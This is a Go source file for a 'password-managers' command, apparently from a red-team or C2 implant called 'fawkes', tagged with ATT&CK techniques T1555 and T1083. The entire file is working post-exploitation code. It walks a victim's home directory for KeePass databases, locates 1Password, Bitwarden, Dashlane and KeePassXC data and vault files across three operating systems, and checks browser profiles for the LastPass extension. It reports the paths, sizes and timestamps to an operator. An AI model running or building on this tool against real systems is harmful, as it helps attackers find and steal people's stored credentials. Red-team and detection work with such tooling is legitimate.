package commands

import (
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

type PasswordManagersCommand struct{}

func (c *PasswordManagersCommand) Name() string { return "password-managers" }
func (c *PasswordManagersCommand) Description() string {
	return "Discover password manager databases and configuration files (T1555, T1083)"
}

type pmArgs struct {
	Depth int `json:"depth"` // max directory recursion depth for .kdbx search
}

type pmResult struct {
	Manager  string
	Path     string
	Size     int64
	Modified string
	Details  string
}

func (c *PasswordManagersCommand) Execute(task structs.Task) structs.CommandResult {
	args, parseErr := unmarshalParams[pmArgs](task)
	if parseErr != nil {
		return *parseErr
	}
	if args.Depth <= 0 {
		args.Depth = 4
	}

	home, err := os.UserHomeDir()
	if err != nil {
		return errorf("Error: cannot determine home directory: %v", err)
	}

	var results []pmResult

	// KeePass: search for .kdbx files starting from home directory
	seen := make(map[string]bool)
	findKDBX(home, args.Depth, &results, seen)

	// 1Password
	check1Password(home, &results)

	// Bitwarden
	checkBitwarden(home, &results)

	// LastPass (browser extensions)
	checkLastPass(home, &results)

	// Dashlane
	checkDashlane(home, &results)

	// KeePassXC config
	checkKeePassXC(home, &results)

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== Password Manager Discovery (%d items found) ===\n\n", len(results)))

	for _, r := range results {
		sb.WriteString(fmt.Sprintf("[%s] %s\n", r.Manager, r.Path))
		if r.Size > 0 {
			sb.WriteString(fmt.Sprintf("  Size: %s, Modified: %s\n", formatFileSize(r.Size), r.Modified))
		}
		if r.Details != "" {
			sb.WriteString(fmt.Sprintf("  %s\n", r.Details))
		}
	}

	if len(results) == 0 {
		sb.WriteString("No password manager databases or configurations detected.\n")
	}

	return successResult(sb.String())
}

func findKDBX(root string, maxDepth int, results *[]pmResult, seen map[string]bool) {
	_ = filepath.WalkDir(root, func(path string, d os.DirEntry, err error) error {
		if err != nil {
			return filepath.SkipDir
		}

		// Calculate depth relative to root
		rel, _ := filepath.Rel(root, path)
		depth := strings.Count(rel, string(filepath.Separator))
		if d.IsDir() && depth >= maxDepth {
			return filepath.SkipDir
		}

		if !d.IsDir() && strings.HasSuffix(strings.ToLower(d.Name()), ".kdbx") {
			absPath, _ := filepath.Abs(path)
			if seen[absPath] {
				return nil
			}
			seen[absPath] = true
			info, _ := d.Info()
			var size int64
			var modTime string
			if info != nil {
				size = info.Size()
				modTime = info.ModTime().UTC().Format(time.RFC3339)
			}
			*results = append(*results, pmResult{
				Manager:  "KeePass",
				Path:     path,
				Size:     size,
				Modified: modTime,
				Details:  "KeePass database file",
			})
		}
		return nil
	})
}

func check1Password(home string, results *[]pmResult) {
	var paths []string
	switch runtime.GOOS {
	case "windows":
		localAppData := os.Getenv("LOCALAPPDATA")
		if localAppData != "" {
			paths = append(paths, filepath.Join(localAppData, "1Password"))
			paths = append(paths, filepath.Join(localAppData, "1password"))
		}
	case "darwin":
		paths = append(paths,
			filepath.Join(home, "Library", "Group Containers", "2BUA8C4S2C.com.1password"),
			filepath.Join(home, "Library", "Application Support", "1Password"),
		)
	case "linux":
		paths = append(paths,
			filepath.Join(home, ".config", "1password"),
			filepath.Join(home, ".config", "1Password"),
		)
	}

	for _, p := range paths {
		info, err := os.Stat(p)
		if err != nil {
			continue
		}
		*results = append(*results, pmResult{
			Manager:  "1Password",
			Path:     p,
			Modified: info.ModTime().UTC().Format(time.RFC3339),
			Details:  "1Password data directory",
		})
	}
}

func checkBitwarden(home string, results *[]pmResult) {
	var paths []string
	switch runtime.GOOS {
	case "windows":
		appData := os.Getenv("APPDATA")
		if appData != "" {
			paths = append(paths, filepath.Join(appData, "Bitwarden"))
		}
	case "darwin":
		paths = append(paths, filepath.Join(home, "Library", "Application Support", "Bitwarden"))
	case "linux":
		paths = append(paths, filepath.Join(home, ".config", "Bitwarden"))
	}

	for _, p := range paths {
		info, err := os.Stat(p)
		if err != nil {
			continue
		}
		detail := "Bitwarden desktop data directory"
		// Check for data.json (encrypted vault)
		dataJSON := filepath.Join(p, "data.json")
		if di, derr := os.Stat(dataJSON); derr == nil {
			detail = fmt.Sprintf("Bitwarden vault: data.json (%s)", formatFileSize(di.Size()))
		}
		*results = append(*results, pmResult{
			Manager:  "Bitwarden",
			Path:     p,
			Modified: info.ModTime().UTC().Format(time.RFC3339),
			Details:  detail,
		})
	}
}

func checkLastPass(home string, results *[]pmResult) {
	// LastPass stores data in browser extension directories
	var chromePaths []string
	switch runtime.GOOS {
	case "windows":
		localAppData := os.Getenv("LOCALAPPDATA")
		if localAppData != "" {
			chromePaths = append(chromePaths,
				filepath.Join(localAppData, "Google", "Chrome", "User Data"),
				filepath.Join(localAppData, "Microsoft", "Edge", "User Data"),
			)
		}
	case "darwin":
		chromePaths = append(chromePaths,
			filepath.Join(home, "Library", "Application Support", "Google", "Chrome"),
		)
	case "linux":
		chromePaths = append(chromePaths,
			filepath.Join(home, ".config", "google-chrome"),
			filepath.Join(home, ".config", "chromium"),
		)
	}

	// LastPass Chrome extension ID
	lastPassExtID := "hdokiejnpimakedhajhdlcegeplioahd"

	for _, browserPath := range chromePaths {
		// Check Default and numbered profiles
		for _, profile := range []string{"Default", "Profile 1", "Profile 2"} {
			extPath := filepath.Join(browserPath, profile, "Extensions", lastPassExtID)
			if info, err := os.Stat(extPath); err == nil {
				*results = append(*results, pmResult{
					Manager:  "LastPass",
					Path:     extPath,
					Modified: info.ModTime().UTC().Format(time.RFC3339),
					Details:  "LastPass browser extension detected",
				})
			}
		}
	}
}

func checkDashlane(home string, results *[]pmResult) {
	var paths []string
	switch runtime.GOOS {
	case "windows":
		appData := os.Getenv("APPDATA")
		if appData != "" {
			paths = append(paths, filepath.Join(appData, "Dashlane"))
		}
	case "darwin":
		paths = append(paths, filepath.Join(home, "Library", "Application Support", "Dashlane"))
	case "linux":
		paths = append(paths, filepath.Join(home, ".config", "dashlane"))
	}

	for _, p := range paths {
		info, err := os.Stat(p)
		if err != nil {
			continue
		}
		*results = append(*results, pmResult{
			Manager:  "Dashlane",
			Path:     p,
			Modified: info.ModTime().UTC().Format(time.RFC3339),
			Details:  "Dashlane data directory",
		})
	}
}

func checkKeePassXC(home string, results *[]pmResult) {
	var paths []string
	switch runtime.GOOS {
	case "windows":
		appData := os.Getenv("APPDATA")
		if appData != "" {
			paths = append(paths, filepath.Join(appData, "KeePassXC"))
		}
	case "darwin":
		paths = append(paths, filepath.Join(home, "Library", "Application Support", "KeePassXC"))
	case "linux":
		paths = append(paths,
			filepath.Join(home, ".config", "keepassxc"),
			filepath.Join(home, ".cache", "keepassxc"),
		)
	}

	for _, p := range paths {
		info, err := os.Stat(p)
		if err != nil {
			continue
		}
		detail := "KeePassXC configuration directory"
		// Check for keepassxc.ini which may contain recent database paths
		ini := filepath.Join(p, "keepassxc.ini")
		if _, ierr := os.Stat(ini); ierr == nil {
			detail = "KeePassXC config (may contain recent database paths)"
		}
		*results = append(*results, pmResult{
			Manager:  "KeePassXC",
			Path:     p,
			Modified: info.ModTime().UTC().Format(time.RFC3339),
			Details:  detail,
		})
	}
}
